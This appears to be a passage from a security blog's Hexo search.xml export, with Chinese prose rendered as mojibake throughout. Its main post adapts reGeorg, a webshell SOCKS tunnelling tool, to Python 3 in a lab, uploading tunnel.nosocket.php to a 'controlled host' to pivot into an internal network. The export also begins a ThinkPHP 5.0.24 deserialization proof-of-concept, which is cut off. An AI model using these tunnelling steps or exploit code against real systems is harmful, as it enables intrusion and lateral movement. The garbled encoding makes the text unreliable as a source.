        <tag>CVE-2022-0778</tag>
        <tag>openssl</tag>
        <tag>Dos</tag>
        <tag>æ‹’ç»æœåŠ¡</tag>
      </tags>
  </entry>
  <entry>
    <title>Regeorg ä»python2æ”¹é€ ä¸ºpython3-ä»å®æˆ˜ä¸­å­¦ä¹ socks5åè®®</title>
    <url>/archives/97967489.html</url>
    <content><![CDATA[<p>è¿™ä¸¤å¤©æ²¡å•¥å·¥ä½œï¼Œä¸€èˆ¬è¿™æ—¶å€™æˆ‘éƒ½ä¸ä¼šå‘æŒ¥è‡ªå·±çš„ä¸»è§‚èƒ½åŠ¨æ€§å»ä¸»åŠ¨æ‰¾æ´»ï¼Œäºæ˜¯ä¹åªèƒ½ä¸Šç½‘çœ‹çœ‹åšå®¢ï¼Œæå‡æå‡è‡ªå·±çš„æŠ€æœ¯ã€‚æƒ³èµ·åœ¨è¿™å®¶å…¬å¸å‘†ä¹…äº†æŠŠå†…ç½‘æ–¹é¢æœ¬æ¥å°±ä¸å¤šçš„çŸ¥è¯†éƒ½å¿«ä¸¢å…‰äº†ï¼Œäºæ˜¯ä¹è¶ç€éš¾å¾—æ¸…é—²å‡†å¤‡è¡¥å……è¡¥å……è¥å…»ã€‚çœ‹äº†ä¸€äº›ä¸å†…ç½‘ç©¿é€ç›¸å…³çš„åšå®¢ï¼Œå‡†å¤‡å®æ“çš„æ—¶å€™é‡åˆ°äº†éº»çƒ¦ã€‚æœ¬ç€é€¢å±±å¼€è·¯é‡æ°´æ¶æ¡¥çš„ç²¾ç¥ï¼Œä»Šå¤©åŠ¿å¿…è¦æŠŠè¿™ä¸ªé—®é¢˜æ‹¿ä¸‹ã€‚</p>
<h1 id="é—®é¢˜æè¿°"><a href="#é—®é¢˜æè¿°" class="headerlink" title="é—®é¢˜æè¿°"></a>é—®é¢˜æè¿°</h1><p>Regeorgæ˜¯åªæä¾›äº†å¯¹python2çš„æ”¯æŒï¼Œä½¿ç”¨python3æ¥è¿è¡Œçˆ†äº†ä¸€å¤§ä¸²é”™æˆ‘ï¼Œä»Šå¤©å’±å°±ä¸€ä¸ªé—®é¢˜ä¸€ä¸ªé—®é¢˜å¾—æå®šï¼Œæ‰‹æŠŠæ‰‹æ•™ä½ æ€ä¹ˆæŠŠRegeorgæ”¹é€ æˆpython3ç‰ˆæœ¬ã€‚çœ‹äº†ä¸‹è¿™ä¸ªé¡¹ç›®8å¹´å‰å¹´å°±åœæ­¢æ›´æ–°äº†<br><img src="https://i-blog.csdnimg.cn/blog_migrate/97ecb5ee4338329ab06c0b030df7da84.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<span id="more"></span>
<h1 id="è§£å†³è¿‡ç¨‹"><a href="#è§£å†³è¿‡ç¨‹" class="headerlink" title="è§£å†³è¿‡ç¨‹"></a>è§£å†³è¿‡ç¨‹</h1><h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><table>
<thead>
<tr>
<th>å¹³å°</th>
<th>ipåœ°å€</th>
</tr>
</thead>
<tbody><tr>
<td>ç‰©ç†æœºï¼ˆwindows11ï¼‰</td>
<td>192.168.1.101</td>
</tr>
<tr>
<td>è™šæ‹Ÿæœº1ï¼ˆcentos7ï¼‰</td>
<td>åŒç½‘å¡192.168.248.146(nat)ã€172.16.128.2(ä»…ä¸»æœºæ¨¡å¼)</td>
</tr>
<tr>
<td>è™šæ‹Ÿæœº2ï¼ˆwindows7ï¼‰</td>
<td>172.16.128.1(ä»…ä¸»æœºæ¨¡å¼ï¼Œæ­å»ºäº†webæœåŠ¡å™¨)</td>
</tr>
<tr>
<td>ç‰©ç†æœºä½œä¸ºæˆ‘ä»¬çš„æ”»å‡»æœºï¼Œå¯ä»¥æ­£å¸¸ä¸è™šæ‹Ÿæœº1é€šä¿¡ï¼Œè™šæ‹Ÿæœº1å®‰è£…äº†webæœåŠ¡ä½œä¸ºå—æ§ä¸»æœºï¼Œå¯æ­£å¸¸ä¸ç‰©ç†æœºä¸è™šæ‹Ÿæœº2é€šä¿¡ï¼Œè™šæ‹Ÿæœº2æ¨¡æ‹Ÿå†…ç½‘ä¸»æœºï¼Œä»…èƒ½ä¸è™šæ‹Ÿæœº1é€šä¿¡ä¸èƒ½ä¸ç‰©ç†æœºé€šä¿¡</td>
<td></td>
</tr>
</tbody></table>
<h2 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h2><p>é¦–å…ˆæˆ‘ä»¬æŠŠé¡¹ç›® cloneä¸‹æ¥<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d531a71d517083d9bebe4aeb09d61e0f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å› ä¸ºè¢«æ§ä¸»æœºçš„ä¸­é—´ä»¶è§£æå™¨ä¸ºPHPæ‰€ä»¥è¿™é‡Œé€‰æ‹©phpåç¼€çš„è„šæœ¬ä½œä¸ºä»£ç†è½¬å‘æœåŠ¡å™¨ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªphpæ–‡ä»¶ï¼Œä»–ä¸¤çš„åŒºåˆ«åœ¨äºä¸€ä¸ªä½¿ç”¨äº†dlåŠ è½½åŠ¨æ€é“¾æ¥åº“ä¸€ä¸ªæ²¡æœ‰<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6302ac82d9c11e48049e198ddd612390.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™ä¹ˆçœ‹æ¥è¯¥æ–‡ä»¶åªèƒ½åœ¨windowsç¯å¢ƒä¸‹ä½¿ç”¨ï¼Œä¸”å› ä¸ºPHPè²Œä¼¼æ˜¯5.2ä¹‹åå°±æº¢å‡ºäº†dlå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸ç”¨è¿™ä¸ªæ–‡ä»¶è€Œç”¨tunnel.nosocket.phpæ¥ä½œä¸ºä»£ç†æœåŠ¡å™¨ã€‚å½“è¯¥æ–‡ä»¶è¢«ä¸Šä¼ åˆ°å—æ§ä¸»æœºåä½¿ç”¨æµè§ˆå™¨è®¿é—®è¯¥æ–‡ä»¶<br><img src="https://i-blog.csdnimg.cn/blog_migrate/58625b0f130fb888f7066a19ac678cbc.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¦‚æœçœ‹åˆ°è¿™äº›å­—å°±è¯æ˜æœåŠ¡å™¨å·²å°±ä½ï¼Œå½“ç„¶è¿™ä¸ªè¿‡ç¨‹å¯èƒ½å¹¶ä¸ä¼šé‚£ä¹ˆé¡ºåˆ©ï¼Œä½ å¯èƒ½ä¼šé‡åˆ°çš„é—®é¢˜ä¸ºæƒé™é—®é¢˜å¯¼è‡´çš„æ–‡ä»¶ä¸å¯ç”¨ï¼Œè¿™æ—¶å€™åªéœ€ä½¿ç”¨<code>linux</code>å‘½ä»¤<code>chmod</code>ç»™ <code>tunnel.nosocket.php</code>èµ‹äºˆæ›´é«˜çš„æƒé™å°±okäº†ã€‚<br>ç„¶åæˆ‘ä¹ˆè¿è¡Œå‘½ä»¤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -p 8754 -u http://192.168.248.145/tunnel.nosocket.php</span><br></pre></td></tr></table></figure>
<p>åœ¨æˆ‘ä»¬çš„æ”»å‡»æœºä¸Šèµ·ä¸€ä¸ªå®¢æˆ·ç«¯<br><img src="https://i-blog.csdnimg.cn/blog_migrate/fa058e1d062e8d304184d650d283e46a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŠ¥é”™äº†ï¼Œè¿™ä¸ªå¾ˆè§åˆ°ï¼ŒæŠŠä»£ç é‡Œæ‰€æœ‰çš„<code>except</code>è¯­å¥ä¸­çš„é€—å·æ”¹æˆ<code>as</code>å°±å¥½äº†ã€‚ç„¶åè¿è¡ŒåˆæŠ¥é”™äº†<br><img src="https://i-blog.csdnimg.cn/blog_migrate/98b84fedce2f56ca214ae1589a3389f6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™ä¸ªä¹Ÿå¾ˆç®€å•ï¼Œ<code>print</code>çš„å†™æ³•ä¸å¯¹ï¼Œæ”¹æˆ<code>print()</code>å°±å¥½äº†ï¼Œå†è¿è¡Œ</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/7a6b1c432a99fd9eea79db8888ece049.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¯´æ˜¯å°‘äº†æ¨¡å—ï¼Œçœ‹ä¸€ä¸‹æ€ä¹ˆå¼•å…¥çš„<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7bbc7c72185f3c3a55a613ba4cb04af3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><code>python3</code>é‡Œé¢<code>urlparse</code>é›†æˆåˆ°<code>urllib</code>åŒ…é‡Œé¢ï¼Œç›´æ¥åˆ æ‰è¿™ä¸€è¡Œç„¶åé‡æ–°å¯¼å…¥<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ecead071f4b5bbd407812026d4051afd.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>å†è¿è¡Œè™½ç„¶æ²¡æœ‰è¯´æ²¡æœ‰æŠ¥é”™ä½†æ˜¯æç¤ºäº†ï¼Œ<code>georg</code>æ²¡æœ‰å‡†å¤‡å¥½<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a84e9ac7cc5e22b2806783cdbc43f736.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨ä»£ç é‡Œæœä¸€ä¸‹è¿™å¥æŠ¥é”™åœ¨å“ªå„¿å‡ºç°çš„<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e9c237dc00808f555a523bbb2d759238.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>çœ‹æ¥æ˜¯è¿™è¡Œ<code>askGeorg</code>è¿”å›äº†<code>False</code>ï¼Œè·Ÿè¿›å»çœ‹çœ‹<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ced66d140d30ac8e35728340dc47e33d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‡ç‚¹ç”»çº¢æ¡†çš„åœ°æ–¹ï¼Œå†…å±‚çš„ifè¯­å¥æ²¡æœ‰è¿›å»ï¼Œæˆ‘ä»¬ç›´æ¥æ‰“å°ä¸€ä¸‹ç›¸å…³çš„å€¼çœ‹çœ‹<br><img src="https://i-blog.csdnimg.cn/blog_migrate/82e89d004969163ba8c14115fdad24ed.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ³¨æ„åˆ°<code>response.dat</code>è¿”å›çš„æ˜¯å­—èŠ‚ç±»å‹ä¸<code>BASICCHECKSTRING</code>çš„å­—ç¬¦ä¸²ç±»å‹è‚¯å®šä¸ç›¸ç­‰ï¼Œæˆ‘ä»¬å°†<code>BASICCHECKSTRING</code>çš„ç±»å‹ä¿®æ”¹ä¸ºå­—èŠ‚æ–‡æœ¬å°±<code>ok</code>äº†ï¼Œè®°å¾—ä¸è¦å†ä½¿ç”¨<code>strip</code>å»é™¤ä¸¤ç«¯ç©ºç™½å­—ç¬¦<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0ec6fa88abffe7b8479c6051b0212c39.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/7df90243bf7ab5b29611e562a4407c2c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å†è¿è¡Œçœ‹èµ·æ¥okäº†<br><img src="https://i-blog.csdnimg.cn/blog_migrate/44eccbbfe4dc6f729a1dd632b5651cc4.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å½“ç„¶äº‹æƒ…æ²¡æœ‰é‚£ä¹ˆç®€å•ï¼Œè¿™æ—¶å€™æˆ‘ä»¬ä½¿ç”¨<code>proxifier</code>å°†æœ¬åœ°åº”ç”¨çš„æµé‡ä»£ç†åˆ°<code>regeorg</code>å®¢æˆ·ç«¯è¯•ä¸€ä¸‹<br>é…ç½®ä»£ç†æœåŠ¡å™¨<br><img src="https://i-blog.csdnimg.cn/blog_migrate/76abbec7793072c7e1fde2a8a2df5250.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é…ç½®ä»£ç†è§„åˆ™<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6547dde1f41b35a9de072dfbe3fdb792.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œæ³¨æ„ç¬¬ä¸€å¤„çº¢æ¡†å¤„æ˜¯ä¸ºäº†è®©æœ¬åœ°ç¯å›ç½‘å¡çš„æµé‡éƒ½é€šè¿‡ç›´è¿çš„æ–¹å¼è®¿é—®ï¼Œé¿å…æ­»å¾ªç¯ï¼Œç¬¬äºŒå¤„çº¢æ¡†åˆ™æ˜¯å°†ä½¿ç”¨chromeæµè§ˆå™¨è®¿é—®<code>172.16.128.1</code>çš„æµé‡éƒ½è½¬å‘åˆ°æˆ‘ä»¬çš„<code>regeorg</code>å®¢æˆ·ç«¯ã€‚ç„¶åæˆ‘ä»¬ç”¨æµè§ˆå™¨è®¿é—®ä¸€ä¸‹<code>172.16.128.1</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/5c8f58075f2a46b420c95e81b8f08bdc.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°è®¿é—®å¤±è´¥äº†ï¼Œè€Œä¸”<code>regeorg</code>å®¢æˆ·ç«¯å±éƒ½æ²¡æœ‰å†’ï¼Œè¿™è‚¯å®šæ˜¯å“ªé‡Œå‡ºç°äº†é—®é¢˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿˜æ˜¯æ¥è°ƒè¯•ä¸€ä¸‹</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/aba99a4b53948789d732d47502454885.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœ€ç»ˆçš„è¯·æ±‚æ˜¯ç”±è¿™æ¡è¯­å¥è¿›è¡Œçš„é‚£ä¹ˆæˆ‘ä»¬è·Ÿè¿›å»çœ‹çœ‹ï¼Œè¿™é‡Œè°ƒç”¨äº†<code>start</code>æ–¹æ³•ï¼Œåº”è¯¥æ˜¯å¤šçº¿ç¨‹çš„å†™æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥å»æ‰¾<code>run</code>æ–¹æ³•<br><img src="https://i-blog.csdnimg.cn/blog_migrate/742086ad66da9674eadc46708c9c167d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ³¨æ„åˆ°åˆšæ‰æ§åˆ¶å°æ²¡æœ‰æ‰“å°æ—¥å¿—ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰æŠ¥é”™ä¹Ÿæ²¡æœ‰è¿›å…¥ifåˆ†æ”¯ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œifçš„åˆ¤æ–­æ¡ä»¶è¿”å›äº†<code>false</code>ï¼Œé‚£ä¹ˆè·Ÿè¿›å»çœ‹<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2ba215498dff04709a1e3487da1be6d6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œå°±æ˜¯åœ¨å¯¹<code>socks</code>åè®®è¿›è¡Œè§£æäº†ï¼Œé¦–å…ˆè¯»å–äº†ä¸€ä¸ªå­—èŠ‚ï¼Œè¿™é‡Œçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ä¹Ÿå°±æ˜¯ä½¿ç”¨çš„åè®®ç‰ˆæœ¬å·ï¼Œè¿™é‡Œä¸º<code>socks5</code>åè®®ï¼Œæˆ‘ä»¬æ‰“å°ä¸€ä¸‹çœ‹çœ‹<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a8b92d967f4a49d2092512c8eba00d50.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¾ˆæ˜æ˜¾è¿™é‡Œåˆæ˜¯æ•°æ®ç±»å‹æœ‰é—®é¢˜ï¼Œåœ¨<code>python2</code>ä¸­å­—èŠ‚æ–‡æœ¬ä¸æ–‡æœ¬å­—ç¬¦ä¸²æ˜¯ä¸åˆ†å¼€çš„æ‰€ä»¥æ— æ‰€è°“ï¼Œä½†<code>python</code>é‡Œåšäº†ä¸¥æ ¼çš„åŒºåˆ†ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å°†è¿ä¸ª<code>if</code>åˆ¤æ–­æ¡ä»¶æ”¹ä¸ºå­—èŠ‚æ–‡æœ¬ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/416ea62c6df5f7ee88081d90139d4f9c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å†è¿è¡Œ<br><img src="https://i-blog.csdnimg.cn/blog_migrate/76cfa7252d15c299dd537ddf8bab7ca5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆæŠ¥é”™äº†ï¼Œè¿™é‡Œè¯´çš„æ˜¯åœ¨141è¡Œéœ€è¦ä¸€ä¸ªå­—èŠ‚å¯¹è±¡ï¼Œä½†ç»™äº†ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé‚£å°±åˆ°141è¡Œ<br><img src="https://i-blog.csdnimg.cn/blog_migrate/37e3efc518bf7d2004c79c68f6b722dc.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œçš„<code>VER</code>ä¸<code>METHOD</code>ä¸ºå®šä¹‰çš„ä¸¤ä¸ªå­—ç¬¦ä¸²å¸¸é‡ï¼Œæˆ‘ä»¬çŸ¥é“<code>sockets</code>çš„<code>sendall</code>æ˜¯ä¸èƒ½å‘é€å­—ç¬¦ä¸²çš„éœ€è¦å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨<code>encode</code>æ–¹æ³•åŒä¸€ä¿®æ”¹æˆ–è€…åœ¨å…¶å®šä¹‰çš„åœ°æ–¹ä¿®æ”¹<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ceeac2b3ba3c44fe58b54d3f0606667a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å†è¿è¡Œï¼ŒåˆæŠ¥é”™<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0703ef906c9884e66280559026b329f5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¯´çš„æ˜¯166è¡Œ<code>None</code>ç±»å‹ä¸èƒ½è¿›è¡Œåˆ‡ç‰‡ï¼Œä¹Ÿå°±æ˜¯è¯´<code>targetPort</code>è¿”å›äº†<code>None</code>ï¼Œå»çœ‹çœ‹<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e942c6c511496d40a72f12f185203247.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£ä¹ˆå†çœ‹çœ‹<code>targetPort</code>å“ªé‡Œæ¥çš„<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8e607021b4b8f987b760e045b0c62569.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¤§æ„å°±æ˜¯é€šè¿‡<code>atyp</code>çš„å€¼ï¼Œæ¥åˆ¤æ–­<code>targetPort</code>çš„å–å€¼æ–¹å¼ï¼Œè¿™é‡Œå¾ˆæ˜æ˜¾è¿˜æ˜¯æ•°æ®ç±»å‹å¯¼è‡´çš„ï¼Œè€è§„çŸ©ç›´æ¥æ”¹æˆå­—èŠ‚æ–‡æœ¬ï¼ŒåŒæ—¶æ³¨æ„åˆ°è¿™é‡Œä¼šç»§ç»­å¯¹<code>proxifier</code>å‘è¿‡æ¥çš„æ¡æ‰‹åŒ…è¿›è¡Œè§£æï¼Œå…ˆè§£æä¸¤ä¸ªå­—èŠ‚ï¼Œä¸€ä¸ªå­—èŠ‚æ˜¯<code>nmethods</code>ï¼Œä¸€ä¸ªä¸º<code>methods``ï¼Œnmethods</code>è¡¨ç¤ºå¯ä»¥ä½¿ç”¨çš„æ–¹æ³•ï¼Œ<code>methods</code>è¡¨ç¤ºæ–¹æ³•çš„å€¼ã€‚ç„¶å<code>regeorg</code>ä¼šé€‰æ‹©å¯ç”¨çš„æ–¹æ³•ç»™<code>proxifier</code>å›åŒ…å‘Šè¯‰å‘å®¢æˆ·ç«¯ç¡®è®¤åè®®ç‰ˆæœ¬å·ä»¥åŠä½¿ç”¨çš„æ–¹æ³•ã€‚è¿™é‡Œçœ‹ä¸€ä¸‹è¿™å‡ ä¸ªå‚æ•°çš„å€¼</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/5ad30111475af280ed290ec3dae3ae3a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/1a1b501ffb0d39e593fdd3779a6ea606.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶å<code>proxifier</code>ä¼šå†å›ä¸€ä¸ªåŒ…ï¼Œè¿™é‡Œè¿›è¡Œè§£æ<br><img src="https://i-blog.csdnimg.cn/blog_migrate/304db3550a2ae2b4a9b29c291d0996b9.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é¦–å…ˆç¬¬ä¸€ä¸ªå­—èŠ‚ä»»ç„¶æ˜¯ç‰ˆæœ¬å·ï¼Œç„¶åæ ¹æ®ç‰ˆæœ¬å·çš„ä¸åŒä¼šæœ‰ä¸åŒçš„è§£ææ–¹å¼ï¼Œè¿™é‡Œç›´æ¥çœ‹<code>socks5</code>çš„æ ¼å¼<br>åé¢å­—èŠ‚åˆ†åˆ«ä¸ºå‘½ä»¤ï¼Œä¿ç•™ä½ä»¥åŠç›®æ ‡ç±»å‹ï¼Œè¿™é‡Œçœ‹ä¸€ä¸‹å€¼<br><img src="https://i-blog.csdnimg.cn/blog_migrate/fcf7266a7587289ac9b3ab14fed79f80.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘½ä»¤ä¸º01ï¼Œä¹Ÿå°±æ˜¯è¿æ¥è¯·æ±‚ï¼Œä¿ç•™ä½ä¸ç®¡ï¼Œç„¶åæ˜¯ç›®æ ‡ç±»å‹01ä¹Ÿå°±æ˜¯ipv4åœ°å€ã€‚<br>è¿™äº›éƒ½äº†è§£äº†æˆ‘ä»¬ç»§ç»­çœ‹æŠ¥é”™çš„å†…å®¹<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3a0ae96d858aac3a66887b752deea43a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¯´ordå‡½æ•°æ‹¿åˆ°äº†ä¸€ä¸ªæ•´æ•°ï¼Œä½†éœ€è¦çš„æ˜¯1ä¸ªå­—ç¬¦ï¼Œè¿™é‡Œç›´æ¥æ”¹<br><img src="https://i-blog.csdnimg.cn/blog_migrate/002db315455703ef5072157e3d276ec3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å†è¿è¡Œ<br><img src="https://i-blog.csdnimg.cn/blog_migrate/462d7582eb007c1a3b95ecc2327c0772.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿˜æ˜¯è¿™å„¿ä¸è¿‡æŠ¥é”™å†…å®¹å˜äº†ï¼Œè¿˜æ˜¯æ•°æ®ç±»å‹çš„é—®é¢˜ï¼Œç›´æ¥æ”¹å°±å®Œäº†<br><img src="https://i-blog.csdnimg.cn/blog_migrate/176be127ed8938f9f8efc3a0e05fb0f4.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿è¡Œï¼Œçœ‹æŠ¥é”™<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ab9f3cf728b02c6ca63667e371686f5f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>è¿™é‡Œè¯´çš„æ˜¯è¿æ¥ç›®æ ‡å¤±è´¥ï¼Œç„¶åæˆ‘æœäº†è¿™ä¸€å¥æŠ¥é”™åœ¨ä»£ç é‡Œé¢æ²¡æœ‰ï¼Œé‚£ä¹ˆåªæœ‰å¯èƒ½æ¥è‡ªæœåŠ¡ç«¯çš„å“åº”ï¼Œå»æœåŠ¡ç«¯æœ<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b6f114b7d3786ad8062e0c88bcfe2db4.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™ä¸€çœ‹å°±æ˜¯socketè¿æ¥å¤±è´¥äº†ï¼Œç„¶åæˆ‘ä¸€çœ‹æˆ‘è™šæ‹Ÿæœºè‡ªåŠ¨æŒ‚èµ·äº†ï¼Œé‡æ–°å¼€èµ·æ¥å†è¿è¡Œ<br><img src="https://i-blog.csdnimg.cn/blog_migrate/834676e13418f033c9f5b1d41572ea24.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆæ˜¯æ•°æ®ç±»å‹é—®é¢˜ï¼Œç›´æ¥æ”¹<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1676c712ac01528957e13c058c8c6104.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å†è¿è¡Œ<br><img src="https://i-blog.csdnimg.cn/blog_migrate/9d0b4e6115dab04a5e526c3f903181d1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æå®šäº†ï¼Œä¸è¿‡æµè§ˆå™¨çš„æ¸²æŸ“ç»“æœæ˜¯è¿™æ ·çš„<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e93be96c679b771f49e124bb63fc58fd.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å“åº”æ— æ•ˆï¼Œè¯´æ˜æ˜¯å“åº”çš„é—®é¢˜ï¼Œç„¶åæˆ‘ä½¿ç”¨<code>proxifier</code>ä»£ç†äº†<code>burp</code>çš„æµé‡çœ‹äº†ä¸‹å“åº”<br><img src="https://i-blog.csdnimg.cn/blog_migrate/bc9496b44d736bf6b0cc1459df0d5f08.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åè®®å‰å¤´å¤šäº†ä¸ª<code>P</code>å•Šï¼Œè¿™æµè§ˆå™¨è§£æä¸äº†å¾ˆæ­£å¸¸ï¼Œç§‰æŒç€æ‰“ç ´ç ‚é”…é—®åˆ°åº•çš„ç²¾ç¥ï¼Œæˆ‘ä»¬è¿˜æ˜¯è¦è£…æ ·å­çœ‹çœ‹è¿™ä¸ª<code>P</code>æ€ä¹ˆæ¥çš„ï¼Œæ‰€ä»¥è¿™é‡Œæ‰“å°ä¸€ä¸‹å®¢æˆ·ç«¯ä»æœåŠ¡ç«¯è·å–çš„å“åº”<br><img src="https://i-blog.csdnimg.cn/blog_migrate/caf0cbb99f1dfb5b61d66f8e36d0f54f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™ä¹Ÿæ²¡æœ‰<code>P</code>å•Šï¼Œè¯æ˜åº”è¯¥ä¸æ˜¯<code>regeorg</code>çš„é—®é¢˜ï¼Œé‚£ä¹ˆå°±æ˜¯<code>proxifier</code>çš„é—®é¢˜äº†ï¼Œè¿™ä¸ªå°±æœ‰ç‚¹éš¾æäº†ã€‚ã€‚ã€‚</p>
]]></content>
      <categories>
        <category>åè®®è§„èŒƒ</category>
      </categories>
      <tags>
        <tag>socks5</tag>
        <tag>Regeorg</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP5.0.24ååºåˆ—åŒ–POC</title>
    <url>/archives/5ce634cf.html</url>
    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Driver</span>&#123;</span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * <span class="title class_">Driver</span> <span class="title class_">constructor</span>.</span><br><span class="line">         */</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">options</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; options = [</span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span 